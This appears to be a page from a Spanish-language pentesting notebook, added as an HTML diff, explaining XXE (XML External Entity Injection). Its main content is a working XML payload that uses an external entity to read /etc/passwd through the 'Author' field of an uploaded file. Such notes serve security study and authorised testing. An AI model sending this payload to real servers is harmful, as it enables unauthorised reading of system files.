@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>XXE (XML External Entity Injection)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>XXE (XML External Entity Injection)</h1><br/>Cuando podamos subir archivos XML a un servidor intentaremos comprobar si podemos injectarle codigo malicioso<br /><br /><div class="codebox"><div class="codebox">&lt;?xml&nbsp;&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;ISO-8859-1&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[<br />&nbsp;&nbsp;&nbsp;&lt;!ELEMENT&nbsp;foo&nbsp;ANY&nbsp;&gt;<br />&nbsp;&nbsp;&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&nbsp;&quot;file:///etc/passwd&quot;&nbsp;&gt;]&gt;<br />&lt;elements&gt;<br />	&lt;Author&gt;&amp;xxe;&lt;/Author&gt;<br />	&lt;Subject&gt;test&lt;/Subject&gt;<br />	&lt;Content&gt;test&lt;/Content&gt;<br />&lt;/elements&gt;<br /></div></div><br /><br />En el ejemplo anterior indicamos la estructura que nos pide el servidor que tenga nuestro XML y le injectamos codigo en el campo “Author”<br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
+</body>
+</html>
